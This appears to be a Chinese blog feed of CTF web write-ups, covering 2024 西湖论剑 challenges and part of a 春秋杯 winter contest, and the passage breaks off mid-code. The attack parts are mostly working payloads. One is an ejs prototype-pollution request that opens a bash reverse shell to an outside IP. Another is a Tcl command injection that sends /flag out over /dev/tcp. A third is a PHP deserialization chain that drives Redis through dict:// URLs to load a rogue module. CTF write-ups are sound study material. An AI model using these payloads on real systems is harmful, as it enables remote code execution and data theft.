class="hljs-keyword">if</span> (err) &#123;                            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;文件重命名失败！&#x27;</span>);                        &#125; <span class="hljs-keyword">else</span> &#123;                            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;文件重命名成功！&#x27;</span>);                        &#125;                    &#125;);                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;文件重命名失败！&#x27;</span>);            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;哒咩哒咩！&#x27;</span>);        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;文件重命名失败！&#x27;</span>);    &#125;&#125;);<span class="hljs-keyword">function</span> <span class="hljs-title function_">findKeyByValue</span>(<span class="hljs-params">obj, targetValue</span>) &#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key) &amp;&amp; obj[key] === targetValue) &#123;            <span class="hljs-keyword">return</span> key;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 如果未找到匹配的键名，返回null或其他标识</span>&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>) &#123;            data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)            <span class="hljs-keyword">if</span> (data.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;outputFunctionName&#x27;</span>) || data.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;escape&#x27;</span>) || data.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;delimiter&#x27;</span>) || data.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;localsName&#x27;</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;&#125;<span class="hljs-comment">//设置http</span><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8888</span>,<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;http://127.0.0.1:%s&quot;</span>, port)&#125;);</code></pre></div><p>&#x2F;app&#x2F;package.json</p><div class="code-wrapper"><pre><code class="hljs Bash">&#123;  <span class="hljs-string">&quot;dependencies&quot;</span>: &#123;    <span class="hljs-string">&quot;cookie-parser&quot;</span>: <span class="hljs-string">&quot;^1.4.6&quot;</span>,    <span class="hljs-string">&quot;ejs&quot;</span>: <span class="hljs-string">&quot;^3.1.5&quot;</span>,    <span class="hljs-string">&quot;express&quot;</span>: <span class="hljs-string">&quot;^4.18.2&quot;</span>,    <span class="hljs-string">&quot;express-fileupload&quot;</span>: <span class="hljs-string">&quot;^1.4.3&quot;</span>,    <span class="hljs-string">&quot;jsonwebtoken&quot;</span>: <span class="hljs-string">&quot;^9.0.2&quot;</span>,    <span class="hljs-string">&quot;lodash&quot;</span>: <span class="hljs-string">&quot;^4.17.4&quot;</span>,    <span class="hljs-string">&quot;multer&quot;</span>: <span class="hljs-string">&quot;^1.4.5-lts.1&quot;</span>,    <span class="hljs-string">&quot;putil-merge&quot;</span>: <span class="hljs-string">&quot;^3.6.0&quot;</span>,    <span class="hljs-string">&quot;rpc&quot;</span>: <span class="hljs-string">&quot;^3.3.3&quot;</span>,    <span class="hljs-string">&quot;sqlite3&quot;</span>: <span class="hljs-string">&quot;^5.1.7-rc.0&quot;</span>,    <span class="hljs-string">&quot;uuid&quot;</span>: <span class="hljs-string">&quot;^9.0.1&quot;</span>  &#125;&#125;</code></pre></div><p>很容易找出putil_merge有原型链污染 <a href="https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487">https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487</a></p><p>以及ejs结合原型链污染的rce漏洞</p><p>利用  <code>/rename</code>路由的<code>putil_merge(global.fileDictionary,&#123;[uuid]:newFileName&#125;,&#123;deep:true&#125;)</code></p><p>进行原型链污染配合ejs的rce</p><p>但waf函数中禁用了关键字</p><div class="code-wrapper"><pre><code class="hljs Bash"><span class="hljs-keyword">function</span> waf(data) &#123;        data = JSON.stringify(data)        <span class="hljs-keyword">if</span> (data.includes(<span class="hljs-string">&#x27;outputFunctionName&#x27;</span>) || data.includes(<span class="hljs-string">&#x27;escape&#x27;</span>) || data.includes(<span class="hljs-string">&#x27;delimiter&#x27;</span>) || data.includes(<span class="hljs-string">&#x27;localsName&#x27;</span>)) &#123;            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>;        &#125;&#125;</code></pre></div><p><code>outputFunctionName</code>、<code>escapeFunction</code>、<code>localsName</code> 均无法使用</p><p>但还剩下个<code>destructuredLocals</code></p><p>我想到了，但是并不会利用，于是也没有尝试</p><p>赛后看WP看到这篇文章</p><p><a href="https://github.com/mde/ejs/issues/730">https://github.com/mde/ejs/issues/730</a></p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rename</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8888<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>255<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://1.14.108.193:31999<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://1.14.108.193:31999/rename<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580051; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580051; JSESSIONID=4BA66C9FC58B7115625D0C036F9FACC1; PHPSESSID=jeopbml5j07ck0pd7nlfq23nok<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-1c">&#123;<span class="hljs-string">&quot;oldFileName&quot;</span>:<span class="hljs-string">&quot;1.js&quot;</span>,<span class="hljs-string">&quot;newFileName&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;destructuredLocals&quot;</span>:[<span class="hljs-string">&quot;__line=__line;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;</span>bash -i &gt;<span class="hljs-meta">&amp; /dev/tcp/8.130.24.188/7775 &lt;&amp;1\&quot;&#x27;);<span class="hljs-comment">//&quot;]&#125;</span></span></span><span class="language-1c">&#125;,<span class="hljs-string">&quot;uuid&quot;</span>:<span class="hljs-string">&quot;7e7f57fd-b62e-4285-bc72-f63a19304960&quot;</span>&#125;</span></code></pre></div><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211040504553.png" alt="image-20240211040504553"></p><p>最后只需要cp提权即可</p><h3 id="unknown的思路"><a href="#unknown的思路" class="headerlink" title="unknown的思路"></a>unknown的思路</h3><p>上传文件加改名，覆盖index.ejs文件</p><p>他们想到了用数组绕过检查<code>..</code></p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211042816504.png" alt="image-20240211042816504"></p><p>但其实我不太理解下面这里</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211042901977.png" alt="image-20240211042901977"></p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211042929582.png" alt="image-20240211042929582"></p><p>？一个失败，一个成功？</p><p>反正最后这种方法测试后发现不行，估计是views没有写权限。</p><h2 id="ezinject"><a href="#ezinject" class="headerlink" title="ezinject"></a>ezinject</h2><p>队里就有人扫了一下发现<code>.git</code>泄露，然后就没后续了，导致现在连jar包都没有</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211043747668.png" alt="image-20240211043747668"></p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240211043800209.png" alt="image-20240211043800209"></p><p>拿到cookie即可访问exec执行命令</p><p>同理，用<code>/exec;.js</code>这样的形式去访问</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215231412195.png" alt="image-20240215231412195"></p><div class="code-wrapper"><pre><code class="hljs tcl"><span class="hljs-comment">#!/usr/bin/tclsh</span><span class="hljs-keyword">set</span> password [<span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">0</span>]<span class="hljs-keyword">set</span> host [<span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">1</span>]<span class="hljs-keyword">set</span> port [<span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">2</span>]<span class="hljs-keyword">set</span> dir [<span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">3</span>]<span class="hljs-keyword">puts</span> <span class="hljs-variable">$argv</span><span class="hljs-keyword">eval</span> spawn ssh -p <span class="hljs-variable">$port</span> <span class="hljs-variable">$host</span> test -d <span class="hljs-variable">$dir</span> &amp;&amp; echo existsexpect <span class="hljs-string">&quot;*(yes/no*)?*$&quot;</span> &#123; send <span class="hljs-string">&quot;yes\n&quot;</span> &#125;<span class="hljs-keyword">set</span> timeout <span class="hljs-number">600</span>expect <span class="hljs-string">&quot;*assword:*$&quot;</span> &#123; send <span class="hljs-string">&quot;$password\n&quot;</span> &#125; \timeout &#123; <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span> &#125;<span class="hljs-keyword">set</span> timeout <span class="hljs-number">-1</span>expect <span class="hljs-string">&quot;\\$ $&quot;</span></code></pre></div><p>我们需要控制host以及dir来执行命令外带flag，并且命令不能包含空格，否则会被Runtime.exec分割成参数，这里使用echo配和bash来外带flag</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/exec;.css</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.14.108.193:30024<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=345313310B2A5657F15FE494DE09BDB1; <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>68<span class="language-jboss-cli"><span class="hljs-keyword">command</span>=<span class="hljs-keyword">echo</span> [system &#x27;`cat&lt;<span class="hljs-string">/flag</span>&gt;<span class="hljs-string">/dev/tcp/8.134.146.39/6666</span>`&#x27;|bash]</span></code></pre></div><p>拼接到命令行中就变成了：</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span> spawn ssh -p [system <span class="hljs-built_in">echo</span> <span class="hljs-built_in">test</span> -d <span class="hljs-string">&#x27;`cat&lt;/flag&gt;/dev/tcp/8.134.146.39/6666`&#x27;</span>|bash]</code></pre></div><p>之前写的没保存，现在随便写点吧，自己的图没了</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215231714189.png" alt="image-20240215231714189"></p><p>这里</p><div class="code-wrapper"><pre><code class="hljs scheme">[<span class="hljs-name">system</span> echo test -d &#x27;`cat&lt;/flag&gt;/dev/tcp/8.134.146.39/6666`&#x27;|bash]</code></pre></div><p>用<code>[]</code>在tcl中可以提前处理</p><h3 id="Boogipop大佬做法"><a href="#Boogipop大佬做法" class="headerlink" title="Boogipop大佬做法"></a>Boogipop大佬做法</h3><p>用<code>\t</code>代替空格。。。看不懂</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215232103528.png" alt="image-20240215232103528"></p><h2 id="ezerp"><a href="#ezerp" class="headerlink" title="ezerp"></a>ezerp</h2><p>华夏erp 最新版3.3</p><p>大佬们都发现了安装插件处存在问题，并且依赖中能找到插件源码</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215232717356.png" alt="image-20240215232717356"></p><p>联系之前的wordpress，本身很少洞，靠的是第三方主题和插件，以后遇到最新版也往这方面想</p><p>已有漏洞</p><p>文件上传 <a href="https://github.com/jishenghua/jshERP/issues/99">https://github.com/jishenghua/jshERP/issues/99</a></p><p>前台权限绕过 <a href="https://github.com/jishenghua/jshERP/issues/98">https://github.com/jishenghua/jshERP/issues/98</a></p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215232548198.png" alt="image-20240215232548198"></p><p>登录然后上传插件</p><p>这里插件jar包要根据源码构造</p><p>具体调试和构造可以看<a href="https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ">微信公众平台 (qq.com)</a></p><p>真的太强了</p><p>这里可以直接用Boogipop大佬找到的项目</p><p><a href="https://gitee.com/xiongyi01/springboot-plugin-framework-parent/tree/master/example/basic-example/plugins">springboot插件式开发框架: 该框架主要是集成于springboot项目，在springboot项目中集成可扩展式的插件开发。 - Gitee.com</a></p><p>改一下内容就行</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215233041729.png" alt="image-20240215233041729"></p><p>这里构造完jar包后，题目给了提示说没有plugins目录</p><p>可以用上面的文件上传漏洞，会递归创建目录</p><p><a href="https://github.com/jishenghua/jshERP/issues/99">https://github.com/jishenghua/jshERP/issues/99</a></p><p>在application.properties中可以看到定义的插件目录</p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215233349173.png" alt="image-20240215233349173"></p><p><img src="/../images/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20240215233404137.png" alt="image-20240215233404137"></p><p>总结一句话就是不会。。。</p><h2 id="数据安全-phpems"><a href="#数据安全-phpems" class="headerlink" title="数据安全 phpems"></a>数据安全 phpems</h2><p><a href="https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA">2024西湖论剑-数据安全-PHPEMS (qq.com)</a></p><p>给个链接，先看着，后来再自己跟着走下</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023年春秋杯网络安全联赛冬季赛-web</title>
    <link href="/2024/02/04/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/"/>
    <url>/2024/02/04/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋杯冬季赛-web"><a href="#春秋杯冬季赛-web" class="headerlink" title="春秋杯冬季赛-web"></a>春秋杯冬季赛-web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web 1&#x2F;3  </p><p>还以为是小比赛呢，题目难度偏高（我是菜鸡</p><h2 id="ezezz-php"><a href="#ezezz-php" class="headerlink" title="ezezz_php"></a>ezezz_php</h2><p>不难，但我刷题太少了，redis主从复制rce不熟练，耗了很长时间</p><div class="code-wrapper"><pre><code class="hljs awk">&lt;?php class Rd&#123;    public <span class="hljs-variable">$ending</span>;    public <span class="hljs-variable">$cl</span>;    public <span class="hljs-variable">$poc</span>;    public <span class="hljs-keyword">function</span> __destruct()&#123;        <span class="hljs-regexp">//</span> echo <span class="hljs-string">&quot;All matters have concluded&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;    &#125;    public <span class="hljs-keyword">function</span> __call(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$arg</span>)&#123;        foreach (<span class="hljs-variable">$arg</span> as <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;POC&#x27;</span>] == <span class="hljs-string">&quot;0.o&quot;</span>) &#123;                <span class="hljs-variable">$this</span>-&gt;cl-&gt;var1 = <span class="hljs-string">&quot;get&quot;</span>;            &#125;        &#125;    &#125;&#125;class Poc&#123;    public <span class="hljs-variable">$payload</span>;    public <span class="hljs-variable">$fun</span>;    public <span class="hljs-keyword">function</span> __set(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>)&#123;        <span class="hljs-variable">$this</span>-&gt;payload = <span class="hljs-variable">$name</span>;        <span class="hljs-variable">$this</span>-&gt;fun = <span class="hljs-variable">$value</span>;    &#125;    <span class="hljs-keyword">function</span> getflag(<span class="hljs-variable">$paylaod</span>)&#123;        echo <span class="hljs-string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;        file_get_contents(<span class="hljs-variable">$paylaod</span>);    &#125;&#125;class Er&#123;    public <span class="hljs-variable">$symbol</span>;    public <span class="hljs-variable">$Flag</span>;    public <span class="hljs-keyword">function</span> __construct()&#123;        <span class="hljs-variable">$this</span>-&gt;symbol = True;    &#125;    public <span class="hljs-keyword">function</span> __set(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>)&#123;           <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,base64_decode(<span class="hljs-variable">$this</span>-&gt;Flag)))&#123;               <span class="hljs-variable">$value</span>(<span class="hljs-variable">$this</span>-&gt;Flag);        &#125;    <span class="hljs-keyword">else</span> &#123;    echo <span class="hljs-string">&quot;NoNoNo,please you can look hint.php&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;    &#125;  &#125;&#125;class Ha&#123;    public <span class="hljs-variable">$start</span>;    public <span class="hljs-variable">$start1</span>;    public <span class="hljs-variable">$start2</span>;    public <span class="hljs-keyword">function</span> __construct()&#123;        <span class="hljs-regexp">//</span> echo <span class="hljs-variable">$this</span>-&gt;start1 . <span class="hljs-string">&quot;__construct&quot;</span> . <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;    &#125;    public <span class="hljs-keyword">function</span> __destruct()&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;start2 === <span class="hljs-string">&quot;o.0&quot;</span>) &#123;            <span class="hljs-variable">$this</span>-&gt;start1-&gt;Love(<span class="hljs-variable">$this</span>-&gt;start);            <span class="hljs-regexp">//</span> echo <span class="hljs-string">&quot;You are Good!&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>) &#123;    <span class="hljs-regexp">//</span> <span class="hljs-variable">$url</span>=base64_decode(<span class="hljs-variable">$url</span>);    <span class="hljs-regexp">//</span> var_dump(<span class="hljs-variable">$url</span>);    <span class="hljs-regexp">//</span> <span class="hljs-variable">$ch</span> = curl_init();    <span class="hljs-regexp">//</span> curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);    <span class="hljs-regexp">//</span> curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    <span class="hljs-regexp">//</span> curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);    <span class="hljs-regexp">//</span> <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);    <span class="hljs-regexp">//</span> <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);    <span class="hljs-regexp">//</span> var_dump(<span class="hljs-variable">$result_info</span>);    <span class="hljs-regexp">//</span> curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-regexp">//</span> var_dump(<span class="hljs-variable">$output</span>);&#125;<span class="hljs-regexp">//</span> Ha::__destruct() -&gt; Rd::__call() -&gt; Er::__set() -&gt; get()<span class="hljs-regexp">//</span> payload 按顺序发，公网上建好evil redis-server<span class="hljs-regexp">//</span> <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;dict://127.0.0.1:6379/config:set:dir:/tmp&quot;</span>;<span class="hljs-regexp">//</span> <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;dict://127.0.0.1:6379/config:set:dbfilename:exp.so&quot;</span>;<span class="hljs-regexp">//</span> <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;dict://127.0.0.1:6379/slaveof:x.x.x.x:7777&quot;</span>;<span class="hljs-regexp">//</span> <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;dict://127.0.0.1:6379/module:load:/tmp/exp.so&quot;</span>;<span class="hljs-regexp">//</span> <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;dict://127.0.0.1:6379/slave:no:one&quot;</span>;<span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;dict://127.0.0.1:6379/system.exec:env&quot;</span>;<span class="hljs-variable">$Er</span> = new Er();<span class="hljs-variable">$Er</span> -&gt; Flag = base64_encode(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$Rd</span> = new Rd();<span class="hljs-variable">$Rd</span> -&gt; cl = <span class="hljs-variable">$Er</span>;<span class="hljs-variable">$Ha</span> = new Ha();<span class="hljs-variable">$Ha</span> -&gt; start = [<span class="hljs-string">&#x27;POC&#x27;</span>=&gt;<span class="hljs-string">&#x27;0.o&#x27;</span>];<span class="hljs-variable">$Ha</span> -&gt; start1 = <span class="hljs-variable">$Rd</span>;<span class="hljs-variable">$Ha</span> -&gt; start2 = <span class="hljs-string">&#x27;o.0&#x27;</span>;echo(serialize(<span class="hljs-variable">$Ha</span>)); ?&gt;</code></pre></div><p>调用到get函数查看hint.php的话，会告诉你</p><p>主机名不是db，而是127.0.0.1</p><p>这一看就是redis</p><p>项目<a href="https://github.com/Dliv3/redis-rogue-server">Dliv3&#x2F;redis-rogue-server: Redis 4.x&#x2F;5.x RCE (github.com)</a></p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> redis-rogue-server.<span class="hljs-keyword">py</span> --server-<span class="hljs-keyword">only</span></code></pre></div><p>然后payload语句一句一句打下来就行</p><h2 id="picup"><a href="#picup" class="headerlink" title="picup *"></a>picup *</h2><p>刚开始注册和登录</p><p>然后就有上传文件</p><p>测试发现内容过滤了许多东西，且测出限制长度为70</p><p>随便传点内容上去，点击一下跳转到另一个页面 </p><p>url为<code>/pic.php?pic=1.php</code>(我的文件名为1.php)</p><p>我当时就觉得有文件包含，但是我<code>../</code>发现没有用，之后就是没用的测试了，卡在这里</p><p>这里的话其实是双写绕过<code>..././</code>         。。。。啊这</p><p>在<code>/app/app.py</code>下发现了文件源码</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, redirect<span class="hljs-keyword">from</span> Users <span class="hljs-keyword">import</span> Users<span class="hljs-keyword">from</span> waf <span class="hljs-keyword">import</span> wafusers = Users()app = Flask(__name__)app.template_folder = <span class="hljs-string">&quot;./&quot;</span>app.secret_key = users.passwords[<span class="hljs-string">&#x27;admin&#x27;</span>] = hashlib.md5(os.urandom(<span class="hljs-number">32</span>)).hexdigest()<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index.php&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;login.php&quot;</span>)    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> request.files <span class="hljs-keyword">and</span> (filename := waf(request.files[<span class="hljs-string">&#x27;file&#x27;</span>])):        filepath = os.path.join(<span class="hljs-string">&quot;./uploads&quot;</span>, filename)        request.files[<span class="hljs-string">&#x27;file&#x27;</span>].save(filepath)        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;File upload success! Path: &lt;a href=&#x27;pic.php?pic=&quot;</span> + filename + <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> + filepath + <span class="hljs-string">&quot;&lt;/a&gt;.&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login.php&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-keyword">and</span> (username := request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)) <span class="hljs-keyword">and</span> (    password := request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)):        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(username) == <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(password) == <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> users.login(username, password):            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login success! &lt;a href=&#x27;/&#x27;&gt;Click here to redirect.&lt;/a&gt;&quot;</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login fail!&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register.php&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-keyword">and</span> (username := request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)) <span class="hljs-keyword">and</span> (    password := request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)):        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(username) == <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(password) == <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> username.isnumeric() <span class="hljs-keyword">and</span> users.register(username,                                                                                                           password):            str1 = <span class="hljs-string">&quot;Register successs! Your username is &#123;username&#125; with hash: &#123;&#123;users.passwords[&#123;username&#125;]&#125;&#125;.&quot;</span>.<span class="hljs-built_in">format</span>(                username=username).<span class="hljs-built_in">format</span>(users=users)            <span class="hljs-keyword">return</span> str1        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register fail!&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pic.php&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">pic</span>():    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):        <span class="hljs-keyword">return</span> 